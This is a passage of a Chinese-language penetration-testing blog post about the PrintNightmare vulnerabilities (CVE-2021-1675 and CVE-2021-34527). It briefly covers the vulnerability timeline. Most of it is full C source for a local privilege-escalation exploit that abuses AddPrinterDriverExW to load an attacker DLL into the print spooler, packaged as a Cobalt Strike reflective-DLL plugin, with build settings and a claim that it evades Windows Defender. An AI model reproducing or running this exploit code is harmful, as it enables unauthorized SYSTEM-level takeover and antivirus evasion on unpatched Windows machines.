        DWORD dwReturned;
        DRIVER_INFO_2* pInfo;
        DWORD i;
        EnumPrinterDriversW(NULL, NULL, 2, NULL, 0, &dwNeeded, &dwReturned);
        lpDriverInfo = (LPBYTE)LocalAlloc(LPTR, dwNeeded);
        if (lpDriverInfo == NULL) {
            return 0;
        }
        EnumPrinterDrivers(NULL, NULL, 2, lpDriverInfo, dwNeeded, &dwNeeded, &dwReturned);
        pInfo = (DRIVER_INFO_2*)lpDriverInfo;
        for (i = 0; i pDriverPath, L"ntprint.inf_amd64")) {
                wchar_t tempDrive1[_MAX_DRIVE] = { 0 };
                wchar_t tempDirectory1[_MAX_DIR] = { 0 };
                wchar_t tempFileName1[_MAX_FNAME] = { 0 };
                wchar_t tempFileExtension1[_MAX_EXT] = { 0 };
                _wsplitpath_s(pInfo->pDriverPath, &tempDrive1[0], _MAX_DRIVE, &tempDirectory1[0], _MAX_DIR, &tempFileName1[0], _MAX_FNAME, &tempFileExtension1[0], _MAX_EXT);
                wchar_t* targetDLLName = (LPWSTR)L"UNIDRV.DLL";
                wcscat_s(targetDLLPath, MAX_PATH, tempDrive1);
                wcscat_s(targetDLLPath, MAX_PATH, tempDirectory1);
                wcscat_s(targetDLLPath, MAX_PATH, targetDLLName);
                // 这个需要参考
                if (fileExists(targetDLLPath)) {
                    LocalFree(lpDriverInfo);
                    return targetDLLPath;
                }
            }
            pInfo++;
        }
        LocalFree(lpDriverInfo);
    }
### 0x4.2 CVE-2021-34527
了解这个洞，能够使笔者对printnight有更深的认识。
CVE-2021-1675 漏洞点发生在`RpcAddPrinterDriver`  
但是观察上面的POC可以发现，我们是通过`AddPrinterDriverExW`来调用  
我们细读文档,函数的第一个参数:
> pName  
>  A pointer to a null-terminated string that specifies the name of the server
> on which the driver should be installed. If this parameter is NULL, the
> function installs the driver on the local computer.  
>  可以发现这里可以指定一个server的名称，为空的话，则代表安装到本地  
>
> 根据腾讯给出的公告，1675调用的漏洞链是:AddPrinterDriverExW->RpcAddPrinterDriver，但是这个过程没给出具体分析。
网上很多文章都说CVE-2021-34527漏洞点发生在`RpcAsyncAddPrinterDriver`  
笔者去查阅了[漏洞官方通告](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)并感谢两个大佬(原作者)。  
然后又去翻`Zhiniang Peng (@edwardzpeng) & Xuefeng Li
(@lxf02942370)`最初发的POC，公布原因：两位大佬以为自己撞洞。  
是不是看完很迷惑，笔者到这里已经自闭，但仍然坚持进行信息检索。
翻了下twitter的时间线:  
当时有人测试出了CVE-2021-1675,在DC环境是可以成功的，还有具体的图,说明只是修补了本地的洞。  
其中官方信息提到[CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)关于win2019 这个洞的补丁是KB5003646，如图所示，但exp依然打成功了。  
后继续翻@gentilkiwi的twitter 也发现了很多有趣的探讨和利用，等待后续的深入研究。
### 0x4.3 小结
有趣的是，除了这两个CVE-2021-1675、CVE-2021-34527  
被广泛分析之外，未披露POC的有CVE-2021-34481、CVE-2021-36958，猜测是通过寻找新的[端点](https://github.com/SigmaHQ/sigma/blob/master/rules/network/zeek/zeek_dce_rpc_printnightmare_print_driver_install.yml)绕过权限验证来RCE。  
笔者对这个漏洞的前世今生很感兴趣，因为目前环境并不允许，也与本文主题关系不大，所以就此作罢，后面会对这个漏洞进行学习和实操分析，梳理好这个时间线。
## 0x5 EXP->CS插件
前人的肩膀:[CVE-2021-1675-LPE](https://github.com/hlldz/CVE-2021-1675-LPE)  
这里利用的是CVE-2021-1675，直接设置server那么为空，来本地加载驱动。
目标:  
1) 可作为提权模块，成为`elevate`的一个子项  
2) 添加到命令行，指定加载DLL文件
部分代码如下:
    #include "ReflectiveLoader.h"
    extern HINSTANCE hAppInstance;
    #include 
    #include 
    #include 
    #include 
    wchar_t* charTowchar(char* str) {
        int iSize = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
        wchar_t* convertStr = (wchar_t *)malloc(iSize * sizeof(wchar_t));
        MultiByteToWideChar(CP_UTF8, 0, str, -1, convertStr, iSize);
        return convertStr;
    }
    int fileExists(wchar_t* file) {
        WIN32_FIND_DATA FindFileData;
        HANDLE handle = FindFirstFileW(file, &FindFileData);
        int found = handle != INVALID_HANDLE_VALUE;
        if (found) {
            FindClose(handle);
        }
        return found;
    }
    wchar_t* findDLLPath() {
        wchar_t targetDLLPath[MAX_PATH] = { 0 };
        DWORD dwNeeded;
        LPBYTE lpDriverInfo;
        DWORD dwReturned;
        DRIVER_INFO_2* pInfo;
        DWORD i;
        EnumPrinterDriversW(NULL, NULL, 2, NULL, 0, &dwNeeded, &dwReturned);
        lpDriverInfo = (LPBYTE)LocalAlloc(LPTR, dwNeeded);
        if (lpDriverInfo == NULL) {
            return 0;
        }
        EnumPrinterDrivers(NULL, NULL, 2, lpDriverInfo, dwNeeded, &dwNeeded, &dwReturned);
        pInfo = (DRIVER_INFO_2*)lpDriverInfo;
        for (i = 0; i pDriverPath, L"ntprint.inf_amd64")) {
                wchar_t tempDrive1[_MAX_DRIVE] = { 0 };
                wchar_t tempDirectory1[_MAX_DIR] = { 0 };
                wchar_t tempFileName1[_MAX_FNAME] = { 0 };
                wchar_t tempFileExtension1[_MAX_EXT] = { 0 };
                _wsplitpath_s(pInfo->pDriverPath, &tempDrive1[0], _MAX_DRIVE, &tempDirectory1[0], _MAX_DIR, &tempFileName1[0], _MAX_FNAME, &tempFileExtension1[0], _MAX_EXT);
                wchar_t* targetDLLName = (LPWSTR)L"UNIDRV.DLL";
                wcscat_s(targetDLLPath, MAX_PATH, tempDrive1);
                wcscat_s(targetDLLPath, MAX_PATH, tempDirectory1);
                wcscat_s(targetDLLPath, MAX_PATH, targetDLLName);
                if (fileExists(targetDLLPath)) {
                    LocalFree(lpDriverInfo);
                    return targetDLLPath;
                }
            }
            pInfo++;
        }
        LocalFree(lpDriverInfo);
    }
    int CVE_2021_1675_LPE(wchar_t* pthDll) {
        printf("\n[*] CVE-2021-1675 LPE Exploit\n");
        printf("[*] Modified by: xq17 \n");
        printf("[*] Code Reference: Halil Dalabasmaz (@hlldz) \n");
        WCHAR payloadPath[MAX_PATH] = { 0 };
        WCHAR targetDLLPath[MAX_PATH] = { 0 };
        wsprintf(payloadPath, L"%s", pthDll);
        wsprintf(targetDLLPath, L"%ls", findDLLPath());
        printf("\npayloadPath: %ls\n", payloadPath);
        printf("targetDLLPath: %ls\n\n" ,targetDLLPath);
        DRIVER_INFO_2 driverInfo;
        driverInfo.cVersion = 3;
        driverInfo.pConfigFile = payloadPath;
        //driverInfo.pDataFile = (LPWSTR)L"C:\\Windows\\System32\\kernel32.dll";
        driverInfo.pDataFile = payloadPath;
        driverInfo.pDriverPath = targetDLLPath;
        driverInfo.pEnvironment = NULL;
        driverInfo.pName = (LPWSTR)L"SunKorean";
        DWORD addPrinter = AddPrinterDriverExW(NULL, 2, (PBYTE)&driverInfo, APD_COPY_ALL_FILES | 0x10 | 0x8000);
        if(addPrinter){
            printf("[*] AddPrinterDriverExW Ok, done!\n");
        }
        else {
            printf("[-] AddPrinterDriverExW Error, failed!\n");
        }
        printf("[*] All done. GetLastError: %d\n", GetLastError());
        return 0;
    }
    BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
    {
        BOOL bReturnValue = TRUE;
        switch (dwReason)
        {
        case DLL_QUERY_HMODULE:
            if (lpReserved != NULL)
                *(HMODULE*)lpReserved = hAppInstance;
        case DLL_PROCESS_ATTACH:
            hAppInstance = hinstDLL;
            /* print some output to the operator */
            if (strlen((char *)lpReserved) > 0){
                CVE_2021_1675_LPE(charTowchar((char *)lpReserved));
            }
            else {
                printf("Error, No Paramter!\n");
            }
            /* flush STDOUT */
            fflush(stdout);
            /* we're done, so let's exit */
            ExitProcess(0);
            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
        }
        return bReturnValue;
    }
编译之前记得处理下预处理器:
    NDEBUG;ReflectiveDll_EXPORTS;_WINDOWS;_USRDLL;REFLECTIVE_DLL_EXPORTS;REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR;REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN;WIN_X64;%(PreprocessorDefinitions)
因为这个洞是利用DLL加载来实现LPE的，所以你的利用DLL必须要支持过静态查杀(比较简单)  
经过测试，能过window server的window defender，但360会拦截spoolsv进程加载未签名的驱动(可疑程序拦截)。
项目地址:  
## 0x6 总结
本文是偏应用实践类型的文章，其中笔者把日常渗透的一个小场景需求作为出发点，通过对比学习DLL的两种注入手段，理解了Cobalt
Strike的DLL反射加载原理，接下来通过简单分析学习PrintNightMare漏洞后，用CS的插件实现在内存层面利用漏洞，从而躲避AV查杀，完成提权需求。
## 0x7 参考链接
[反射Dll注入分析](https://www.cnblogs.com/lsh123/p/7806811.html)  
[内存加载DLL](https://www.write-bug.com/article/1961.html)  
[PEB及LDR链](https://www.cnblogs.com/gd-luojialin/p/11862767.html)  
[重定位表](https://www.cnblogs.com/lsh123/p/7755187.html)  
[[原创]一篇文章带你了解Dll注入](https://bbs.pediy.com/thread-253918.htm)  
[[原创]恶意代码分析之反射型DLL注入](https://bbs.pediy.com/thread-260235.htm)  
[Windows PrintNightmare
漏洞和补丁分析](https://mp.weixin.qq.com/s/AhumHYAV-_0DrJ47hC25EA)  
[CVE-2021-1675 漏洞及利用分析](https://paper.seebug.org/1635/)  
[PrintNightmare (CVE-2021-1675) Local Privilege
Escalation](https://synawk.com/blog/printnightmare-cve-2021-1675)  
[Windows Print Spooler 服务最新漏洞 CVE-2021-34527
详细分析](https://paper.seebug.org/1632/#validatedriverinfo)  
[New Windows print spooler zero day exploitable via remote print
servers](https://www.bleepingcomputer.com/news/microsoft/new-windows-print-spooler-zero-day-exploitable-via-remote-print-servers/)  
[Reflective DLL Injection](https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection)